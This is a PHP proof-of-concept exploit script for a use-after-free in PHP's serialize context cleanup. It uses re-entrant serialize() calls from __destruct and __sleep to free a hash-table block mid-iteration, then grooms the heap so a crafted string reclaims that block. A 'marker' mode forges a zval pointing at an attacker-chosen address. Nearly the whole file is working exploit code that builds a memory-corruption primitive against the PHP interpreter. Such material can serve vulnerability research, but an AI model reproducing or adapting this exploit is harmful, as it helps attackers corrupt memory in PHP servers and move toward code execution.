<?php
// sr2_reclaim.php — zero5 (vd6 serialize-side UAF) SELF-RECLAIM carrier, M1/M2.
//
// Primitive: php_var_serialize_destroy -> zend_hash_destroy walks the ht of
// the serialize context; the D-pin bucket release runs D::__destruct INSIDE
// the destroy loop; the re-entrant serialize() REUSES the context ht (level
// == 1), its first insert hits nNumUsed(16) >= nTableSize(16) -> resize:
// pemalloc(1280) + copy + pefree(OLD 640-byte arData block) MID-ITERATION.
// The destroy loop's cached p/end still point at the OLD block; it keeps
// walking the FREED 640-byte block (buckets 4..15).
//
// Self-reclaim: Groomer::__sleep (running inside the re-entrant serialize,
// AFTER the efree, with ZERO intervening 640-bin allocations) does
//     str_pad($prefix, 608, "\0")     // 24+608+1 = 633 -> 640 ZendMM bin
// -> LIFO bin freelist pops the JUST-FREED old-arData block. The groom
// string's 608 data bytes now ARE the walked bucket array.
//
// Walked region mapping (block = freed arData block; data = block+24):
//   bucket j val   = block + 128 + 32*j  = data[104+32j, +16)
//   walk starts at bucket 4 (bucket 3 = D pin, already released pre-dtor)
//   => walked bytes = data[232 .. 600); bucket 4 val = data[232..248).
//   data[0..232) is never touched by the walk (hash area + buckets 0..3)
//   => free space for fake structures (see sr2_call.php).
//
// Modes:
//   probe            bucket 4..15 = zeros (IS_UNDEF) -> walk over groomed
//                    bytes executes silently, script SURVIVES (clean-walk
//                    receipt under default ZendMM).
//   marker <hex64>   bucket 4 val = {value=hex64, IS_OBJECT|REFCOUNTED}
//                    -> walk's zval_ptr_dtor does GC_DELREF(hex64)
//                    -> SEGV at the attacker-chosen address (M2 receipt:
//                    faulting value == payload bytes).
//
// Outer ht layout (all pinned via rc>=2 or __sleep, exactly 16/16 buckets):
//   0,1 p1   2,3 D   4..13 five filler stdClass   14,15 Carrier
//   Carrier::__sleep nulls P1->d1/d2 -> D rc 1 (pin only) -> destroy fires.

$mode = $argv[1] ?? 'probe';
$m64  = isset($argv[2]) ? hexdec($argv[2]) : 0x4141414141414141;

class D {
    public function __destruct() {
        $GLOBALS['hits']++;
        // prefix (data[0..248)) built BEFORE the re-entrant serialize:
        // all intermediates are <=288-bin, they cannot touch the 640 bin.
        $GLOBALS['pf'] = $GLOBALS['prefix'];
        $o = new stdClass;
        $a = [$o, new Groomer, $o];   // elem0 pin = insert #17 = resize trigger
        serialize($a);                // re-entrant, context reuse (level==1)
        $GLOBALS['trace'] .= 'D';
    }
}
class Groomer {
    public function __sleep() {
        // THE RECLAIM: single 633->640-bin alloc, first allocation of ANY
        // size after the resize's pefree(old arData). Lands on the freed
        // block (ZendMM small-bin freelist is LIFO).
        $GLOBALS['groom'] = str_pad($GLOBALS['pf'], 608, "\x00");
        return [];
    }
}
class P1 { public $d1; public $d2; }
class Carrier {
    public function __sleep() {
        $GLOBALS['p1']->d1 = null;
        $GLOBALS['p1']->d2 = null;    // object props: no COW, D rc -> 1
        $GLOBALS['trace'] .= 'S';
        return [];
    }
}

if ($mode === 'marker') {
    // bucket-4 forge zval {value=$m64, type_info = IS_OBJECT(8) |
    // IS_TYPE_REFCOUNTED(1<<8) = 0x108}; buckets 5..15 zeros.
    $GLOBALS['prefix'] = str_repeat("\x00", 232) . pack('PVV', $m64, 0x108, 0);
} else {
    $GLOBALS['prefix'] = str_repeat("\x00", 248);
}

$GLOBALS['hits'] = 0; $GLOBALS['trace'] = '';
$GLOBALS['fs'] = [];
for ($i = 0; $i < 5; $i++) $GLOBALS['fs'][] = new stdClass;  // fillers rc 2
$d = new D;
$GLOBALS['p1'] = new P1;
$GLOBALS['p1']->d1 = $d;
$GLOBALS['p1']->d2 = $d;                                      // D rc 2
unset($d);
$arr = [$GLOBALS['p1']];
for ($i = 0; $i < 5; $i++) $arr[] = $GLOBALS['fs'][$i];
$arr[] = new Carrier;
$s = serialize($arr);
echo "hits={$GLOBALS['hits']} trace={$GLOBALS['trace']} len=" . strlen($s) . "\n";
echo "mode=$mode walk-completed\n";
echo "SURVIVED\n";
